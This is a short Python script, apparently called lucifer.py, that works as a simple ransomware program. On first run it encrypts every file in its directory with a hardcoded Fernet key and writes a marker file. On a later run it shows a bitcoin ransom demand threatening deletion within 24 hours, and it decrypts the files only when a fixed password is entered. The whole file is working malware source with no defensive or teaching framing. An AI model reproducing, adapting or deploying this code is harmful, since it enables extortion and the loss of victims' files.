import os
from cryptography.fernet import Fernet
link_to_account= "" #add the link you want them to visit here
if not os.path.exists('luciferchild.txt'):
    with open('luciferchild.txt', 'w') as f:
        f.write('You shall not be able to recover files, if you delete this')
    key = b'xdKRqrw1SDTMBAdggpRcSIk1QtB6Z5j3U4nvKNimGaU='
    files = [f for f in os.listdir('.') if os.path.isfile(f) and f!='lucifer.py' and f!='luciferchild.txt']
    for f in files:
        with open(f, 'rb') as file:
            read=file.read()
        encrypt = Fernet(key).encrypt(read)
        with open(f, 'wb') as file:
            file.write(encrypt)
else:
    sec=input('Send bitcoins, to this account:' + link_to_account + ' else your files shall be deleted within 24 hours\nEnter Key, you got after sending bitcoins>')
    if sec=='coffee':
        key = b'xdKRqrw1SDTMBAdggpRcSIk1QtB6Z5j3U4nvKNimGaU='
        files = [f for f in os.listdir('.') if os.path.isfile(f) and f != 'lucifer.py' and f != 'luciferchild.txt']
        for f in files:
            with open(f, 'rb') as file:
                read = file.read()
            decrypt = Fernet(key).decrypt(read)
            with open(f, 'wb') as file:
                file.write(decrypt)
        print('Enjoy your coffee! Your files have been decrypted!')

